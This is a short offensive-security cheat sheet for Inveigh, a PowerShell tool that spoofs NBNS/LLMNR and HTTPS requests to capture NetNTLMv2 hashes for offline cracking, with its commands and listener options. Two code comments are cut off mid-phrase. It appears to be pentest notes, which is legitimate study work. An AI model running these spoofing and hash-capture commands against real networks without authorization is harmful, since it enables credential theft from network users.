Inveigh is a very useful tool for intercepting and spoofing requests for domain resources. It requests authentication for network access and records the NetNTLMv2 hashes to be cracked offline with [[Hashcat]].

```powershell
Import-Module Inveigh.ps1 # Imports the 
Invoke-Inveigh -NBNS -HTTPS -IP <Local IP> -ConsoleOutput # Default listeners
Get-Inveigh # View all captured hashes
Clear-Inveigh # Clear all captured hashes
Watch-Inveigh # View hashes in real-time as they are captured 
Stop-Inveigh # Stop listening
# The hashes 
```

```powershell
-ConsoleOutput : Enable/Disable real time console output. If using this option through a shell, test to ensure that it doesn’t hang the shell. Medium and Low can be used to reduce output.
-NBNS : Enable/Disable NBNS spoofer.
-HTTPS : Enable/Disable HTTPS challenge/response capture. Warning, a cert will be installed in the local store. If the script does not exit gracefully, manually remove the certificate. This feature requires local administrator access.
-Proxy : Enable/Disable proxy server authentication captures.
-IP : Local IP address for listening and packet sniffing. This IP address will also be used for LLMNR/mDNS/NBNS spoofing if the SpooferIP parameter is not set.
```
